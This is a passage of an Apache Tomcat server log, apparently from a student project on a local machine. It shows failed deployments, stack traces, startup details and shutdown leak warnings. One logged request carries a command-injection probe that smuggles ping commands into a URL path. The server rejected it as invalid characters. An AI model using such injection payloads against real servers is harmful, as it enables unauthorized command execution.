+		at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118)
+		at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:582)
+		at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:472)
+		at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1617)
+		at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:318)
+		at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
+		at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423)
+		at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:898)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:795)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1332)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1322)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:871)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:249)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:428)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:914)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:772)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+	Caused by: org.apache.catalina.LifecycleException: Failed to start component [org.apache.catalina.webresources.StandardRoot@1e13529a]
+		at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198)
+		at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:4607)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4740)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:683)
+		... 37 more
+	Caused by: java.lang.IllegalArgumentException: The main resource set specified [/home/anbvhe150476/NetBeansProjects/mavenproject1/target/mavenproject1-1.0-SNAPSHOT] is not a directory or war file, or is not readable (it does not exist or permissions to access it are missing)
+		at org.apache.catalina.webresources.StandardRoot.createMainResourceSet(StandardRoot.java:749)
+		at org.apache.catalina.webresources.StandardRoot.startInternal(StandardRoot.java:707)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		... 41 more
+11-Jun-2023 21:29:21.125 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml] has finished in [75] ms
+11-Jun-2023 21:29:21.125 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml]
+11-Jun-2023 21:29:21.127 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/PRJ301_3W] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml] has been ignored
+11-Jun-2023 21:29:21.131 SEVERE [main] org.apache.catalina.startup.HostConfig.deployDescriptor Error deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml]
+	java.lang.IllegalStateException: Error starting child
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:686)
+		at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:658)
+		at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:662)
+		at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:689)
+		at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1888)
+		at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118)
+		at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:582)
+		at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:472)
+		at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1617)
+		at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:318)
+		at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
+		at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423)
+		at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:898)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:795)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1332)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1322)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:871)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:249)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:428)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:914)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:772)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+	Caused by: org.apache.catalina.LifecycleException: Failed to start component [org.apache.catalina.webresources.StandardRoot@2f666ebb]
+		at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198)
+		at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:4607)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4740)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:683)
+		... 37 more
+	Caused by: java.lang.IllegalArgumentException: The main resource set specified [/home/anbvhe150476/NetBeansProjects/PRJ301_3W/build/web] is not a directory or war file, or is not readable (it does not exist or permissions to access it are missing)
+		at org.apache.catalina.webresources.StandardRoot.createMainResourceSet(StandardRoot.java:749)
+		at org.apache.catalina.webresources.StandardRoot.startInternal(StandardRoot.java:707)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		... 41 more
+11-Jun-2023 21:29:21.132 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml] has finished in [7] ms
+11-Jun-2023 21:29:21.132 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml]
+11-Jun-2023 21:29:21.133 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/team3] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml] has been ignored
+11-Jun-2023 21:29:22.103 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+11-Jun-2023 21:29:22.196 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml] has finished in [1,064] ms
+11-Jun-2023 21:29:22.197 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/examples]
+11-Jun-2023 21:29:22.463 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/examples] has finished in [266] ms
+11-Jun-2023 21:29:22.464 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/manager]
+11-Jun-2023 21:29:22.489 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/manager] has finished in [24] ms
+11-Jun-2023 21:29:22.489 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/docs]
+11-Jun-2023 21:29:22.517 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/docs] has finished in [27] ms
+11-Jun-2023 21:29:22.517 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/host-manager]
+11-Jun-2023 21:29:22.545 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/host-manager] has finished in [27] ms
+11-Jun-2023 21:29:22.552 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:29:22.584 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in [1635] milliseconds
+11-Jun-2023 21:54:17.915 INFO [http-nio-8082-exec-7] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/product%20|ping%20-n%2021%20127.0.0.1||%60ping%20-c%2021%20127.0.0.1%60%20 ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:490)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 21:55:58.347 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+11-Jun-2023 21:55:58.359 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:55:58.366 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+11-Jun-2023 21:55:58.473 WARNING [main] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesJdbc The web application [team3] registered the JDBC driver [com.microsoft.sqlserver.jdbc.SQLServerDriver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
+11-Jun-2023 21:55:58.493 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [856429e2-b764-4386-bf2e-54f34fa6a505-6]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.495 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [1ef2d034-de45-4f4c-91a6-872d2dda713b-2]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.497 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [de87a756-58c4-4445-ab78-f4cad831abbc-2]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.498 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [9d61ef2b-aa52-4398-b123-b0364a71dbfd-1]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.499 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [2449260d-b72f-4327-b42c-7544ee84e9f0-4]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.501 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [2b9ed166-3969-46ba-8ef4-5db3ee7802de-8]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.502 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [9648711a-0902-4abb-9690-d9127924097d-4]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.505 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@319854f0]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [1d8fb942-b587-4eba-b0a3-70c682eebd25-2]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:55:58.599 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:55:58.744 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:55:58.752 WARNING [main] org.apache.catalina.deploy.NamingResourcesImpl.cleanUp Failed to retrieve JNDI naming context for container [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/PRJ301_3W]] so no cleanup was performed for that container
+	javax.naming.NamingException: No naming context bound to this class loader
+		at org.apache.naming.ContextBindings.getClassLoader(ContextBindings.java:271)
+		at org.apache.catalina.deploy.NamingResourcesImpl.cleanUp(NamingResourcesImpl.java:1010)
+		at org.apache.catalina.deploy.NamingResourcesImpl.stopInternal(NamingResourcesImpl.java:993)
+		at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
+		at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5194)
+		at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:293)
+		at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:778)
+		at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:982)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:778)
+		at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:982)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.StandardService.destroyInternal(StandardService.java:572)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.StandardServer.destroyInternal(StandardServer.java:1036)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.startup.Catalina.stop(Catalina.java:850)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:811)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+11-Jun-2023 22:08:09.490 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/9.0.75
+11-Jun-2023 22:08:09.493 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          May 4 2023 13:04:05 UTC
+11-Jun-2023 22:08:09.493 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 9.0.75.0
+11-Jun-2023 22:08:09.493 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+11-Jun-2023 22:08:09.493 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.15.0-73-generic
+11-Jun-2023 22:08:09.494 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+11-Jun-2023 22:08:09.494 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-11-openjdk-amd64
+11-Jun-2023 22:08:09.494 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           11.0.19+7-post-Ubuntu-0ubuntu120.04.1
+11-Jun-2023 22:08:09.494 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Ubuntu
+11-Jun-2023 22:08:09.494 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 22:08:09.494 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 22:08:09.527 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.lang=ALL-UNNAMED
+11-Jun-2023 22:08:09.528 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.io=ALL-UNNAMED
+11-Jun-2023 22:08:09.528 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util=ALL-UNNAMED
+11-Jun-2023 22:08:09.528 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util.concurrent=ALL-UNNAMED
+11-Jun-2023 22:08:09.529 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
+11-Jun-2023 22:08:09.529 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/logging.properties
+11-Jun-2023 22:08:09.529 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+11-Jun-2023 22:08:09.529 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dhttp.nonProxyHosts=localhost|127.0.0.1|anbvhe150476
+11-Jun-2023 22:08:09.529 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+11-Jun-2023 22:08:09.530 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+11-Jun-2023 22:08:09.530 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+11-Jun-2023 22:08:09.530 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+11-Jun-2023 22:08:09.531 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 22:08:09.531 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 22:08:09.532 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/temp
+11-Jun-2023 22:08:09.559 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent An older version [1.2.23] of the Apache Tomcat Native library is installed, while Tomcat recommends a minimum version of [1.2.30]
+11-Jun-2023 22:08:09.559 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded Apache Tomcat Native library [1.2.23] using APR version [1.6.5].
+11-Jun-2023 22:08:09.559 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true], UDS [false].
+11-Jun-2023 22:08:09.559 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR/OpenSSL configuration: useAprConnector [false], useOpenSSL [true]
+11-Jun-2023 22:08:09.580 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized [OpenSSL 1.1.1f  31 Mar 2020]
+11-Jun-2023 22:08:10.313 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 22:08:10.364 INFO [main] org.apache.catalina.startup.Catalina.load Server initialization in [1286] milliseconds
+11-Jun-2023 22:08:10.543 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+11-Jun-2023 22:08:10.546 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/9.0.75]
+11-Jun-2023 22:08:10.573 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml]
+11-Jun-2023 22:08:10.607 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/mavenproject1] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml] has been ignored
+11-Jun-2023 22:08:10.694 SEVERE [main] org.apache.catalina.startup.HostConfig.deployDescriptor Error deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml]
+	java.lang.IllegalStateException: Error starting child
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:686)
+		at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:658)
+		at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:662)
+		at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:689)
+		at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1888)
+		at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118)
+		at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:582)
+		at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:472)
+		at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1617)
+		at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:318)
+		at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
+		at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423)
+		at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:898)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:795)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1332)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1322)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:871)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:249)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:428)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:914)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
